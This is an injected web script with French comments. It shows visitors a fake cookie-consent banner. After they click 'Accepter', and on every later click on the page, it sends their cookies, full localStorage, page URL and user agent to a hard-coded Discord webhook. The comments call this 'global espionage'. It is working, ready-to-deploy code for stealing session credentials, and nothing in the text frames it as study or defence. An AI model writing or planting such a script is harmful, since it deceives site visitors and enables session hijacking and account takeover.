<script>
window.onload = function() {
    // 1. METS TON WEBHOOK ICI
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";

    // 2. LA FONCTION QUI ENVOIE TOUT
    function envoyerDonnees(raison) {
        let payload = {
            raison: raison,
            url: window.location.href,
            cookies: document.cookie || "AUCUN_COOKIE",
            localStorage: JSON.stringify(localStorage),
            userAgent: navigator.userAgent
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "text/plain" },
            body: JSON.stringify(payload)
        }).catch(e => console.log("Erreur webhook:", e));
    }

    // 3. CRÉATION DE LA BANNIÈRE (Z-index de 10 millions pour être sûr d'être devant)
    let banniere = document.createElement("div");
    banniere.style.cssText = "position:fixed; bottom:0; left:0; width:100%; background:#000; color:#fff; padding:20px; z-index:10000000; text-align:center; border-top:2px solid #0066ff;";
    banniere.innerHTML = 'Nous utilisons des cookies. <button id="btn-accept" style="margin-left:20px; padding:8px 15px; background:#0066ff; color:#fff; border:none; cursor:pointer;">Accepter</button>';
    
    // On l'ajoute au site
    document.body.appendChild(banniere);

    // 4. QUAND ON CLIQUE SUR ACCEPTER
    document.getElementById("btn-accept").onclick = function() {
        banniere.style.display = "none";
        envoyerDonnees("ACCEPTE");
    };

    // 5. ESPIONNAGE GLOBAL : Si on clique sur "Générer" (ou n'importe où), on renvoie les cookies
    document.body.onclick = function(e) {
        // Si on a déjà accepté (la bannière est cachée), on écoute les clics
        if (banniere.style.display === "none") {
            // On attend 1 seconde que le site crée les cookies, puis on envoie
            setTimeout(function() {
                envoyerDonnees("CLIC_SUR_LA_PAGE");
            }, 1000);
        }
    };
};
</script>
